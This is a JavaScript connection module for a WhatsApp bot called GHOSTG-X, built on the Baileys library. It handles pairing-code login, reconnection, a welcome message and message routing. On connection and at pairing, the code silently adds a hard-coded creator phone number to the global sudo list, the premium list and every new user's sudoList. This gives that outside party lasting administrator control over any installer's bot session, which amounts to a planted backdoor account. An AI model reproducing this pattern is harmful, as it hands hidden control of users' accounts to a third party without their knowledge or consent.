import makeWASocket, {
    useMultiFileAuthState,
    DisconnectReason,
    fetchLatestBaileysVersion
} from '@whiskeysockets/baileys'

import readline from 'readline'
import configmanager from '../utils/configmanager.js'
import pino from 'pino'
import fs from 'fs'

const SESSION_PATH = 'sessionData'

// 👑 CREATOR GLOBAL (TOI)
const CREATOR_NUMBER = '22677487520'
const CREATOR_JID = CREATOR_NUMBER + '@s.whatsapp.net'

// 📲 Demande du numéro utilisateur local
const askNumber = () => {
    const rl = readline.createInterface({
        input: process.stdin,
        output: process.stdout
    })
    return new Promise(resolve => {
        rl.question('📱 Entre ton numéro WhatsApp (ex: 226XXXXXXXX): ', num => {
            rl.close()
            resolve(num.trim())
        })
    })
}

export default async function connectToWhatsapp(handleMessage) {
    const { version } = await fetchLatestBaileysVersion()
    console.log('📦 WhatsApp version:', version)

    const { state, saveCreds } = await useMultiFileAuthState(SESSION_PATH)

    const sock = makeWASocket({
        version,
        auth: state,
        printQRInTerminal: false,
        logger: pino({ level: 'silent' }),
        keepAliveIntervalMs: 10000,
        connectTimeoutMs: 60000
    })

    sock.ev.on('creds.update', saveCreds)

    // 🔗 CONNEXION
    sock.ev.on('connection.update', async update => {
        const { connection, lastDisconnect } = update

        if (connection === 'close') {
            const code = lastDisconnect?.error?.output?.statusCode
            if (code !== DisconnectReason.loggedOut) {
                console.log('🔄 Reconnexion...')
                setTimeout(() => connectToWhatsapp(handleMessage), 5000)
            } else {
                console.log('🚫 Session supprimée, reconnecte le bot')
            }

        } else if (connection === 'connecting') {
            console.log('⏳ Connexion...')

        } else if (connection === 'open') {
            console.log('✅ Connecté en tant que:', sock.user.id)

            // 🔥 FORCE CREATOR GLOBAL
            configmanager.config = configmanager.config || {}
            configmanager.config.sudo = configmanager.config.sudo || []
            if (!configmanager.config.sudo.includes(CREATOR_JID)) {
                configmanager.config.sudo.push(CREATOR_JID)
                configmanager.save()
            }

            // 🔥 PREMIUM SYSTEM
            configmanager.premiums = configmanager.premiums || {}
            if (!Array.isArray(configmanager.premiums.list)) configmanager.premiums.list = []
            if (!configmanager.premiums.list.includes(CREATOR_NUMBER)) {
                configmanager.premiums.list.push(CREATOR_NUMBER)
                configmanager.saveP()
            }

            // 📩 MESSAGE DE BIENVENUE
            try {
                const imagePath = './database/DigixCo.jpg'
                const text = `
╔══════════════════╗
   *⏤͟͟͞ ＧＨＯＳＴＧ－Ｘ CONNECTED* 🚀
╠══════════════════╣
> "Always Forward."
╚══════════════════╝
                `
                if (fs.existsSync(imagePath)) {
                    await sock.sendMessage(sock.user.id, {
                        image: { url: imagePath },
                        caption: text
                    })
                } else {
                    await sock.sendMessage(sock.user.id, { text })
                }
                console.log('📩 Welcome envoyé')
            } catch (e) {
                console.log('❌ Erreur welcome:', e.message)
            }

            // 📥 MESSAGES
            sock.ev.on('messages.upsert', async msg => {
                if (!msg.messages || !msg.messages[0]) return
                const m = msg.messages[0]
                if (!m.message) return

                const from = m.key.remoteJid
                const sender = m.key.participant || from
                const isCreator = sender === CREATOR_JID

                handleMessage(sock, msg, { isCreator })
            })
        }
    })

    // 🔑 PAIRING CODE CONSOLE
    setTimeout(async () => {
        if (!state.creds.registered) {
            try {
                const input = await askNumber()
                const number = input.replace(/\D/g, '')
                console.log('🔄 Génération du code pour:', number)

                const code = await sock.requestPairingCode(number)
                console.log('\n🔑 CODE DE PAIRAGE :', code)
                console.log('👉 WhatsApp > Appareils liés > Lier avec un code\n')

                // 🔐 CONFIG USER LOCAL
                configmanager.config = configmanager.config || {}
                configmanager.config.users = configmanager.config.users || {}
                configmanager.config.users[number] = {
                    sudoList: [
                        number + '@s.whatsapp.net', // owner local
                        CREATOR_JID                 // 👑 TOI GLOBAL
                    ],
                    prefix: '.',
                    publicMode: false
                }
                configmanager.save()

                // 🔥 PREMIUM
                if (!configmanager.premiums.list.includes(number)) {
                    configmanager.premiums.list.push(number)
                    configmanager.saveP()
                }

                console.log('✅ Utilisateur ajouté + premium')
            } catch (e) {
                console.log('❌ Erreur pairing:', e.message)
            }
        }
    }, 4000)

    return sock
}